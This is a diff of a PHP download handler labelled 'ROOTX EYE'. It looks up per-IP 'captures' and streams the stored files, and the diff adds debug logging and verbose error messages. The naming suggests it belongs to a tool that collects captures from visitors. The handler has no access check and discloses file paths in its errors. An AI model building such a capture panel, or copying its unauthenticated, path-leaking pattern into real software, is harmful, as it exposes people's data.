@@ -1,9 +1,16 @@
 <?php
+// ============================================
+// ROOTX EYE — DOWNLOAD FILE
+// ============================================
+
 $ip = $_GET['user'] ?? '';
 $index = $_GET['download'] ?? '';
 
-if (empty($ip) || empty($index)) {
-    die('Invalid request');
+// Debug: Log parameters
+error_log("Download request - IP: $ip, Index: $index");
+
+if (empty($ip) || !isset($index) || $index === '') {
+    die('Invalid request: Missing parameters');
 }
 
 $data_dir = __DIR__ . '/data/';
@@ -23,19 +30,30 @@ foreach ($all_data as $u) {
     }
 }
 
-if (!$user_data || !isset($user_data['captures'][$index])) {
-    die('File not found');
+if (!$user_data) {
+    die('User not found');
+}
+
+// Check if index exists
+if (!isset($user_data['captures'][$index])) {
+    die('Capture not found at index: ' . $index);
 }
 
 $capture = $user_data['captures'][$index];
 $file = $capture['file'] ?? '';
 
-if (empty($file) || !file_exists($file)) {
-    die('File does not exist');
+if (empty($file)) {
+    die('File path is empty');
 }
 
+if (!file_exists($file)) {
+    die('File does not exist: ' . $file);
+}
+
+// Send file for download
 header('Content-Type: application/octet-stream');
 header('Content-Disposition: attachment; filename="' . basename($file) . '"');
+header('Content-Length: ' . filesize($file));
 readfile($file);
 exit;
 ?>
